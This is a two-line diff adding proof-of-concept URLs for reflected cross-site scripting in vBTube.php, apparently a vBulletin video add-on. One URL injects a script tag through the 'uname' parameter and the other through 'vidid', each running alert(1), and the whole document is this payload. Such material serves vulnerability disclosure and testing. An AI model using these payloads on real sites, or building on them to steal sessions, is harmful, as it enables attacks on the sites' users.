@@ -1,0 +1,2 @@
+http://www.example.com/cy/vBTube.php?page=1&amp;do=user&amp;uname=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt; 
+http://www.example.com/forum/vBTube.php?do=view&amp;vidid=%22%3E%3Cscript%3Ealert%281%29;%3C/script%3E
